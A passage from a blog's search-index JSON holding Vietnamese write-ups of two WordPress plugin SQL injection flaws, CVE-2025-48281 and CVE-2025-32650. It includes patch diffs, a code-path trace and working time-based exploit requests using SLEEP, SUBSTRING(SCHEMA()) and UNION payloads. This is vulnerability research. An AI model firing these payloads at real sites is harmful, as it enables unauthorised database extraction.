Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTorod\u003c/strong\u003e: v1.9\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003ePOST\u003c/strong\u003e request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø qu·∫£n ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-30936"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin MyStyle Custom Product Designer c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 3.21.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-48281 Product: WordPress MyStyle Custom Product Designer Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 3.21.1 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging MyStyle Custom Product Designer: v3.21.1(vul) v√† v3.21.2(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Actived WooCommerce plugin: plugin b·∫Øt bu·ªôc actived tr∆∞·ªõc khi c√†i MyStyle Custom Product Designer Plugin, m·ªôt s·ªë h√†m trong WooCommerce s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng. Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/entities/class-mystyle-designmanager.php\npublic static function get_designs( $per_page = 250, $page_number = 1, WP_User $user = null ) { global $wpdb; // Add security WHERE clause. $where = self::get_security_where_clause( \u0026#39;WHERE\u0026#39;, $user ); if ( ! empty( $_GET[\u0026#39;orderby\u0026#39;] ) ) { $order = \u0026#39; ORDER BY \u0026#39; . sanitize_text_field( wp_unslash( $_GET[\u0026#39;orderby\u0026#39;] ) ); $order .= ! empty( $_GET[\u0026#39;order\u0026#39;] ) ? \u0026#39; \u0026#39; . sanitize_text_field( wp_unslash( $_GET[\u0026#39;order\u0026#39;] ) ) : \u0026#39; ASC\u0026#39;; } else { $order = \u0026#39; ORDER BY ms_design_id DESC\u0026#39;; } $results = $wpdb-\u0026gt;get_results( $wpdb-\u0026gt;prepare( \u0026#39;SELECT * \u0026#39; . \u0026#34;FROM {$wpdb-\u0026gt;prefix}mystyle_designs \u0026#34; . $where . $order . \u0026#39; LIMIT %d OFFSET %d\u0026#39;, array( $per_page, ( $page_number - 1 ) * $per_page, ) ), \u0026#39;OBJECT\u0026#39; ); // other logic } {: file=\u0026ldquo;includes/entities/class-mystyle-designmanager.php v3.21.1\u0026rdquo; }\nD·ªØ li·ªáu t·ª´ $_GET['orderby'] ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o truy v·∫•n SQL m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t h·ª£p l·ªá. Vi·ªác ch·ªâ s·ª≠ d·ª•ng sanitize_text_field() v√† wp_unslash() m·ªõi d·ª´ng l·∫°i ·ªü m·ª©c lo·∫°i b·ªè k√Ω t·ª± ho·∫∑c escape chu·ªói, ch·ª© kh√¥ng ƒë·∫£m b·∫£o t√≠nh an to√†n. Do ƒë√≥, l·ªó h·ªïng SQLi c√≥ th·ªÉ x·∫£y ra.\npublic static function get_designs( $per_page = 250, $page_number = 1, WP_User $user = null ) { global $wpdb; // Add security WHERE clause. $where = self::get_security_where_clause( \u0026#39;WHERE\u0026#39;, $user ); if ( ! empty( $_GET[\u0026#39;orderby\u0026#39;] ) ) { $orderby = sanitize_text_field( wp_unslash( $_GET[\u0026#39;orderby\u0026#39;] ) ); $order = ! empty( $_GET[\u0026#39;order\u0026#39;] ) ? sanitize_text_field( wp_unslash( $_GET[\u0026#39;order\u0026#39;] ) ) : \u0026#39;ASC\u0026#39;; // Validate order direction to prevent SQL injection. $allowed_orderby = array( \u0026#39;ms_design_id\u0026#39;, \u0026#39;ms_title\u0026#39;, \u0026#39;ms_access\u0026#39;, \u0026#39;ms_email\u0026#39;, \u0026#39;ms_date_created\u0026#39;, \u0026#39;ms_date_modified\u0026#39;, ); $orderby = in_array( strtolower( $orderby ), $allowed_orderby, true ) ? $orderby : \u0026#39;ms_design_id\u0026#39;; $order = in_array( strtoupper( $order ), array( \u0026#39;ASC\u0026#39;, \u0026#39;DESC\u0026#39; ), true ) ? $order : \u0026#39;ASC\u0026#39;; $order = \u0026#39; ORDER BY \u0026#39; . $orderby . \u0026#39; \u0026#39; . $order; } else { $order = \u0026#39; ORDER BY ms_design_id DESC\u0026#39;; } $results = $wpdb-\u0026gt;get_results( $wpdb-\u0026gt;prepare( \u0026#39;SELECT * \u0026#39; . \u0026#34;FROM {$wpdb-\u0026gt;prefix}mystyle_designs \u0026#34; . $where . $order . \u0026#39; LIMIT %d OFFSET %d\u0026#39;, array( $per_page, ( $page_number - 1 ) * $per_page, ) ), \u0026#39;OBJECT\u0026#39; ); // other logic } {: file=\u0026ldquo;includes/entities/class-mystyle-designmanager.php v3.21.2\u0026rdquo; }\nB·∫£n v√° s·ª≠ d·ª•ng while list $allowed_orderby ƒë·ªÉ quy ƒë·ªãnh r√µ c√°c c·ªôt ƒë∆∞·ª£c ph√©p s·∫Øp x·∫øp. N·∫øu gi√° tr·ªã orderby kh√¥ng n·∫±m trong danh s√°ch h·ª£p l·ªá th√¨ s·∫Ω b·ªã thay th·∫ø b·∫±ng m·∫∑c ƒë·ªãnh 'ms_design_id' =\u0026gt; ch·∫∑n kh·∫£ nƒÉng ch√®n payload ƒë·ªôc l·∫°i.\nHow it work? L·ªó h·ªïng n·∫±m trong h√†m get_designs c·ªßa class MyStyle_DesignManager thu·ªôc file includes/entities/class-mystyle-designmanager.php. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_designs trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ get_designs ƒë∆∞·ª£c g·ªçi trong get_items, init_index_request v√† c√°c h√†m test kh√¥ng ƒë√°ng quan t√¢m\nV√¨ ƒë√¢y l√† l·ªói h·ªïng unauthenticated n√™n c·∫ßn ki·ªÉm tra ch√≠nh x√°c h√†m n√†o kh√¥ng c·∫ßn x√°c th·ª±c ng∆∞·ªùi d√πng.\nget_items() Function get_items n·∫±m trong class MyStyle_Wp_Rest_Api_Design_Controller thu·ªôc file includes/wprestapi/class-mystyle-wp-rest-api-design-controller.php\nƒêo·∫°n code tr∆∞·ªõc khi g·ªçi h√†m get_designs kh√¥ng c√≥ g√¨ li√™n quan ƒë·∫øn x√°c th·ª±c ng∆∞·ªùi d√πng n√™n kh√¥ng c·∫ßn quan t√¢m ph·∫ßn ph√≠a sau. get_items ƒë∆∞·ª£c h√†m register_routes trong c√πng class s·ª≠ d·ª•ng l√†m callback c·ªßa REST API th√¥ng qua h√†m register_rest_route() trong WordPress.\npublic function register_routes() { $version = \u0026#39;2\u0026#39;; $vendor = \u0026#39;wc-mystyle\u0026#39;; $namespace = $vendor . \u0026#39;/v\u0026#39; . $version; $base = \u0026#39;designs\u0026#39;; register_rest_route( $namespace, \u0026#39;/\u0026#39; . $base, array( array( \u0026#39;methods\u0026#39; =\u0026gt; WP_REST_Server::READABLE, // GET \u0026#39;callback\u0026#39; =\u0026gt; array( $this, \u0026#39;get_items\u0026#39; ), \u0026#39;permission_callback\u0026#39; =\u0026gt; array( $this, \u0026#39;get_items_permissions_check\u0026#39; ), \u0026#39;args\u0026#39; =\u0026gt; array(), ) ) ) // other logic } {: file=\u0026ldquo;includes/wprestapi/class-mystyle-wp-rest-api-design-controller.php v3.21.1\u0026rdquo; }\nTuy nhi√™n tr∆∞·ªõc khi callback ƒë∆∞·ª£c g·ªçi, c·∫ßn ph·∫£i check permissions b·∫±ng h√†m get_items_permissions_check, ta c·∫ßn ph·∫£i bi·∫øt anonymoust user c√≥ ƒë∆∞·ª£c g·ªçi api n√†y kh√¥ng. T√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_items_permissions_check.\nüëâ get_items_permissions_check g·ªçi ƒë·∫øn wc_rest_check_manager_permissions ƒë·ªÉ ki·ªÉm tra quy·ªÅn v·ªõi $object = 'settings'. ƒê·ªÉ hi·ªÉu h√†m n√†y ƒë∆∞·ª£c s·ª≠ d·ª•ng nh∆∞ th·∫ø n√†o, ta c·∫ßn t√¨m ki·∫øm theo t·ª´ kh√≥a wc_rest_check_manager_permissions trong to√†n b·ªô th∆∞ m·ª•c plugin, b·ªüi v√¨ h√†m n√†y kh√¥ng ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a tr·ª±c ti·∫øp trong plugin hi·ªán t·∫°i.\nwc_rest_check_manager_permissions ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a trong plugin WooCommerce settings mapping th√†nh manage_woocommerce G·ªçi current_user_can( 'manage_woocommerce' ) ƒë·ªÉ ki·ªÉm tra quy·ªÅn c·ªßa user =\u0026gt; Ch·ªâ Admin (ho·∫∑c user c√≥ quy·ªÅn manage_woocommerce). üëâ V√¨ v·∫≠y ta kh√¥ng th·ªÉ khai th√°c t·ª´ h√†m get_items =\u0026gt; khai th√°c h√†m t·ª´ h√†m init_index_request\ninit_index_request() Function init_index_request n·∫±m trong class MyStyle_Design_Profile_Page thu·ªôc file includes/pages/class-mystyle-design-profile-page.php\nƒêo·∫°n code tr∆∞·ªõc khi g·ªçi h√†m get_designs kh√¥ng c√≥ g√¨ li√™n quan ƒë·∫øn x√°c th·ª±c ng∆∞·ªùi d√πng n√™n kh√¥ng c·∫ßn quan t√¢m ph·∫ßn ph√≠a sau. init_index_request ƒë∆∞·ª£c h√†m init trong c√πng class g·ªçi.\npublic function init() { // Check if the current page is /designs if ( ! self::is_current_post() ) { return; } // other logic $design_id = self::get_design_id_from_url(); // Ch·ªâ ho·∫°t ƒë·ªông khi c√°c bi·∫øn trong POST request sau ƒë∆∞·ª£c truy·ªÅn =\u0026gt; kh√¥ng quan t√¢m if( isset( $_POST[\u0026#39;delete_design_nonce\u0026#39;] ) \u0026amp;\u0026amp; wp_verify_nonce( sanitize_key( $_POST[\u0026#39;delete_design_nonce\u0026#39;] ), \u0026#39;mystyle_delete_design_nonce\u0026#39; ) ) { $design = MyStyle_DesignManager::get( $design_id, $user, $session ) ; if ( $design ) { // Check if the user is the owner of the design or an admin. if ( current_user_can( \u0026#39;administrator\u0026#39; ) || MyStyle_DesignManager::is_user_design_owner( $this-\u0026gt;user-\u0026gt;ID, $design_id ) ) { // restrict the design access to 2 (deleted). $design-\u0026gt;set_access( 2 ); MyStyle_DesignManager::persist( $design ); $this-\u0026gt;delete_design_success_message = \u0026#39;Design has been successfully deleted.\u0026#39;; } } } if ( false === $design_id || preg_match( \u0026#39;/page/\u0026#39;, $design_id ) ) { $design_profile_page-\u0026gt;init_index_request(); } else { $design_profile_page-\u0026gt;init_design_request( $design_id ); } } {: file=\u0026ldquo;includes/pages/class-mystyle-design-profile-page.php v3.21.1\u0026rdquo; }\nƒê·ªÉ init_index_request ƒë∆∞·ª£c g·ªçi th√¨ c√¢u ƒëi·ªÅu ki·ªán if ph·∫£i x·∫£y ra, ta c·∫ßn ph·∫£i bi·∫øt $design_id l√† g√¨, t√¨m ki·∫øm h√†m get_design_id_from_url trong c√πng class, v√¨ n√≥ ƒë∆∞·ª£c g·ªçi b·∫±ng self v√† g√°n gi√° tr·ªã cho $design_id\npublic static function get_design_id_from_url() { // Try the query vars ( ex: \u0026amp;design_id=10 ). $design_id = get_query_var( \u0026#39;design_id\u0026#39; ); if ( preg_match( \u0026#39;/page/\u0026#39;, $design_id ) ) { $design_id = false; } elseif ( empty( $design_id ) ) { // ---------- try at /designs/10. -------- // phpcs:ignore $path = $_SERVER[\u0026#39;REQUEST_URI\u0026#39;]; // Get the design profile page\u0026#39;s WP_Post slug. /* @var $post \\WP_Post phpcs:ignore */ $post = get_post( self::get_id() ); $slug = $post-\u0026gt;post_name; $pattern = \u0026#39;/^.*\\/\u0026#39; . $slug . \u0026#39;\\/([\\d]+)/\u0026#39;; if ( preg_match( $pattern, $path, $matches ) ) { $design_id = $matches[1]; } else { $design_id = false; } // ------------------------------------- } return $design_id; } {: file=\u0026ldquo;includes/pages/class-mystyle-design-profile-page.php v3.21.1\u0026rdquo; }\nüëâ H√†m n√†y l·∫•y design_id t·ª´ url n√™n khi kh√¥ng th√™m n√≥ v√†o url khi g·ª≠i request =\u0026gt; if x·∫£y ra =\u0026gt; init_index_request ƒë∆∞·ª£c g·ªçi.\nQuay tr·ªü l·∫°i h√†m init, n√≥ ƒë∆∞·ª£c g·ªçi trong __construct c·ªßa c√πng class.\npublic function __construct() { // other logic add_action( \u0026#39;init\u0026#39;, array( \u0026amp;$this, \u0026#39;rewrite_rules\u0026#39; ) ); add_action( \u0026#39;template_redirect\u0026#39;, array( \u0026amp;$this, \u0026#39;init\u0026#39; ) ); } {: file=\u0026ldquo;includes/pages/class-mystyle-design-profile-page.php v3.21.1\u0026rdquo; }\ninit l√† callback g·∫Øn v√†o hook template_redirect: l√† m·ªôt action hook trong WordPress, ch·∫°y tr∆∞·ªõc khi n·ªôi dung template th·ª±c s·ª± ƒë∆∞·ª£c load v√† hi·ªÉn th·ªã ra tr√¨nh duy·ªát.\nPh√≠a tr√™n hook template_redirect trong __construct c√≤n c√≥ hook init, n√≥ s·∫Ω ch·∫°y tr√™n m·ªói request v·ªõi callback rewrite_rules:\npublic function rewrite_rules() { // Flush rewrite rules for newly created rewrites. flush_rewrite_rules(); add_rewrite_rule( \u0026#39;designs/([a-zA-Z0-9_-].+)?$\u0026#39;, // designs/{slug} \u0026#39;index.php?pagename=designs\u0026amp;design_id=$matches[1]\u0026#39;, \u0026#39;top\u0026#39; ); } H√†m n√†y th√™m route /designs/{id} ƒë·ªÉ load trang designs v√† truy·ªÅn bi·∫øn design_id.\nüëâ Nh∆∞ v·∫≠y khi truy c·∫≠p v√†o /designs/:\nCallback rewrite_rules ƒë∆∞·ª£c g·ªçi, WordPress s·∫Ω load /index.php?pagename=designs\u0026amp;design_id=. design_id kh√¥ng c√≥ gi√° tr·ªã n√™n get_design_id_from_url ƒë∆∞·ª£c g√°n cho $design_id s·∫Ω l√† false =\u0026gt; ƒëi·ªÅu ki·ªán false === $design_id x·∫£y ra khi·∫øn init_index_request trong kh·ªëi if ƒë∆∞·ª£c g·ªçi. init_index_request g·ªçi ƒë·∫øn get_designs get_designs l·∫•y tr·ª±c ti·∫øp orderby t·ª´ GET request th√™m v√†o c√¢u query ƒë·ªÉ th·ª±c thi Exploit Detect SQLi G·ª≠i GET request ch·ª©a payload SQLi.\nGET /designs/?orderby=(SELECT+SLEEP(5)) HTTP/1.1 Host: localhost ... Cookie: cookie_here Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_mystyle_designs WHERE ms_access = 0 ORDER BY (SELECT SLEEP(5)) ASC LIMIT 25 OFFSET 0 üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; payload ho·∫°t ƒë·ªông.\nTrong tr∆∞·ªùng h·ª£p n√†y kh√¥ng n√™n comment ph√≠a sau SLEEP. V√¨ developer ƒë√£ enter khi·∫øn OFFSET xu·ªëng d√≤ng th·ª© 2, khi comment ho·∫°t ƒë·ªông, parser c·ªßa SQL s·∫Ω x·ª≠ l√Ω v√† tr·∫£ v·ªÅ l·ªói. {: .prompt-info }\nCu·ªói c√πng s·∫Ω ƒë∆∞·ª£c t√°ch th√†nh 2 c√¢u query ·ªü 2 d√≤ng kh√°c nhau g√¢y ra l·ªói:\nSELECT * FROM wp_mystyle_designs WHERE ms_access = 0 ORDER BY (SELECT SLEEP(5)) -- ASC LIMIT 25\tOFFSET 0 Get First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload:\nGET /designs/?orderby=IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1) HTTP/1.1 Host: localhost ... Cookie: cookie_here S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(\u0026lsquo;w\u0026rsquo;)\nS·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ orderby ƒë∆∞·ª£c l·∫•y t·ª´ GET request trong n√™n b·ªã escape b·ªüi magic quotes trong WordPress\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nAutomatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t Timebased SQLi ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-48281 trong plugin WordPress MyStyle Custom Product Designer tr∆∞·ªõc phi√™n b·∫£n 3.21.2 xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ tri·ªÉn khai white list, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nKi·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng. Lu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress MyStyle Custom Product Designer Plugin \u0026lt;= 3.21.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-09-cve-2025-48281/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eMyStyle Custom Product Designer\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e3.21.2\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-48281\"\u003eCVE-2025-48281\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/mystyle-custom-product-designer\"\u003eWordPress MyStyle Custom Product Designer Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 3.21.1\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e:  High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMyStyle Custom Product Designer\u003c/strong\u003e:  v3.21.1(vul) v√† v3.21.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eActived WooCommerce plugin\u003c/strong\u003e: plugin b·∫Øt bu·ªôc \u003cstrong\u003eactived\u003c/strong\u003e tr∆∞·ªõc khi c√†i \u003cstrong\u003eMyStyle Custom Product Designer Plugin\u003c/strong\u003e, m·ªôt s·ªë h√†m trong \u003cstrong\u003eWooCommerce\u003c/strong\u003e s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-48281"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Accessibility Suite c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 4.19. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-32650 Product: WordPress Accessibility Suite Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 4.18 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Accessibility Suite: v4.18(vul) v√† v4.19(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ch∆∞a th·ª±c hi·ªán √©p ki·ªÉu cho input v√† m·∫∑c d√π c√≥ s·ª≠ d·ª•ng prepare() ƒë·ªÉ ch·ªëng SQLi, nh∆∞ng do tri·ªÉn khai kh√¥ng ƒë√∫ng n√™n l·ªó h·ªïng SQLi v·∫´n t·ªìn t·∫°i.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/classes/Helper.php\nstatic function save_false_positive($scan_id, $issue_id){ // other logic if(! is_admin()) { return \u0026#39;\u0026#39;; } // other logic $list = json_decode( $wpdb-\u0026gt;get_results($wpdb-\u0026gt;prepare(\u0026#34;SELECT list FROM $table_name WHERE scan_id = $scan_id\u0026#34;))[0]-\u0026gt;list // phpcs:ignore ); } {: file=\u0026ldquo;includes/classes/Helper.php v4.18\u0026rdquo; }\nB·∫£n v√° ƒë√£ truy·ªÅn $scan_id nh∆∞ tham s·ªë v√†o c√¢u query. SQL injection ƒë∆∞·ª£c ph√≤ng ng·ª´a v√¨ bi·∫øn kh√¥ng ƒë∆∞·ª£c n·ªëi tr·ª±c ti·∫øp v√†o query n·ªØa.\nstatic function save_false_positive($scan_id, $issue_id){ // other logic if(! is_admin()) { return \u0026#39;\u0026#39;; } // other logic $scan_id = absint($scan_id); // Ensure scan_id is a positive integer if (!$scan_id) { return [\u0026#34;status\u0026#34; =\u0026gt; \u0026#34;failed\u0026#34;, \u0026#34;msg\u0026#34; =\u0026gt; \u0026#34;Invalid scan ID\u0026#34;]; } // Get list using properly prepared query $query = $wpdb-\u0026gt;prepare( \u0026#34;SELECT list FROM %i WHERE scan_id = %d\u0026#34;, $table_name, $scan_id ); $result = $wpdb-\u0026gt;get_results($query); } {: file=\u0026ldquo;includes/classes/Helper.php v4.19\u0026rdquo; }\nHow it work? L·ªó h·ªïng n·∫±m trong h√†m tƒ©nh save_false_positive c·ªßa class Helper thu·ªôc file includes/classes/Helper.php. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª± kh√≥a save_false_positive trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ save_false_positive ƒë∆∞·ª£c callback c·ªßa action hook wp_ajax_ONLINE_ADAv4/save_false_positive g·ªçi.\nKhi POST request ƒë∆∞·ª£c g·ª≠i ƒë·∫øn /wp-admin/admin-ajax.php v·ªõi action=ONLINE_ADAv4/save_false_positive callback ƒë∆∞·ª£c g·ªçi. Trong request c·∫ßn 2 POST param issue_id v√† scan_id. N·∫øu kh√¥ng, ·ª©ng d·ª•ng s·∫Ω tr·∫£ v·ªÅ:\n{\u0026#34;status\u0026#34;:\u0026#34;failed\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;Did not receive the scan ID or the issue ID\u0026#34;} save_false_positive ƒë∆∞·ª£c g·ªçi v·ªõi ƒë·ªëi s·ªë issue_id v√† scan_id. C√°c ƒë·ªëi s·ªë n√†y s·∫Ω b·ªã escape b·ªüi magic quotes trong WordPress v√¨ l·∫•y tr·ª±c ti·∫øp t·ª´ POST request.\n·ª®ng d·ª•ng check xem ng∆∞·ªùi d√πng c√≥ quy·ªÅn truy c·∫≠p v√†o trang admin kh√¥ng. N·∫øu kh√¥ng, tr·∫£ v·ªÅ chu·ªói r·ªóng.\nif(! is_admin()) { return \u0026#39;\u0026#39;; } Sau ƒë√≥ c√°c ƒë·ªëi s·ªë tr·ª±c ti·∫øp truy·ªÅn v√†o c√¢u query ch·ª©a l·ªó h·ªïng SQLi r·ªìi th·ª±c thi.\nExploit Detect SQLi G·ª≠i POST request ch·ª©a payload SQLi. V√¨ ch·ªâ c·∫ßn l√† user c√≥ quy·ªÅn truy c·∫≠p v√†o trang admin, n√™n ta t·∫°o user v·ªõi role:subcriber c√≥ privilege th·∫•p nh·∫•t.\nTrong WordPress, user c√≥ role cao h∆°n s·∫Ω k·∫ø th·ª´a c·∫£ privilege role th·∫•p h∆°n. N√™n ch·ªâ c·∫ßn user subcriber g·ª≠i payload th√†nh c√¥ng th√¨ t·∫•t c·∫£ user c√≤n l·∫°i ƒë·ªÅu c√≥ th·ªÉ. ƒê√∫ng v·ªõi m√¥ t·∫£ c·ªßa CVE\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded; charset=UTF-8 ... Cookie: cookie_here action=ONLINE_ADAv4/save_false_positive\u0026amp;issue_id=1\u0026amp;scan_id=1 UNION SELECT SLEEP(5) Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh\nSELECT list FROM wp_oada_false_positives WHERE scan_id = 1 UNION SELECT SLEEP(5) üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; payload ho·∫°t ƒë·ªông.\nC√°c technique c√≥ th·ªÉ s·ª≠ d·ª•ng trong tr∆∞·ªùng h·ª£p table r·ªóng:\nUNION: v√¨ n√≥ kh√¥ng ph·ª• thu·ªôc v√†o d·ªØ li·ªáu b·∫£ng c·ªßa c√¢u query tr∆∞·ªõc ƒë√≥, nh∆∞ng c·∫ßn ph·∫£i t√¨m ƒë∆∞·ª£c s·ªë c·ªôt t∆∞∆°ng ·ª©ng v·ªõi truy v·∫•n tr∆∞·ªõc ƒë√≥. Subquery: Subquery trong m·ªánh 